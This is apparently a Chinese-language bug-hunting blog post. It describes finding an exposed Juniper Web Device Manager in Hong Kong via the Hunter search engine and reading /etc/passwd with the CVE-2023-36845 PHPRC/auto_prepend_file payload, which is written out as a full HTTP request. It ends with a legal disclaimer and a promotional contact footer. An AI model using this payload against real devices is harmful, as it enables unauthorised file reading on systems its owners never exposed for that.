# 原创
：  记src-Juniper

# 记src-Juniper

### 一、hunter搜索web.title=”Juniper Web Device Manager”，查找到香港的一处资产。

### 二、访问相关网页，界面就是Juniper登录界面。

### 三、根据编号为CVE-2023-36845的利用方法，抓包，修改提交方式，成功读取到文件。

原始包如下：<br/>  

<br/> payload如下：

```
POST /?PHPRC=/dev/fd/0 HTTP/1.1

Host: {{Hostname}}

Content-Type: application/x-www-form-urlencoded



auto_prepend_file="/etc/passwd"
```

修改传参方式，并按照上述payload在路径后面拼接上”?PHPRC=/dev/fd/0”，请求体中加入auto_prepend_file参数。结果如下：

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

**没看够~？欢迎关注！**

[+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）腾讯文档-在线文档<img alt="icon-default.png?t=N7T8" src="https://csdnimg.cn/release/blog_editor_html/release2.3.6/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N7T8"/>https://docs.qq.com/doc/DYmVETWlZemh0Ymdv](https://docs.qq.com/doc/DYmVETWlZemh0Ymdv)
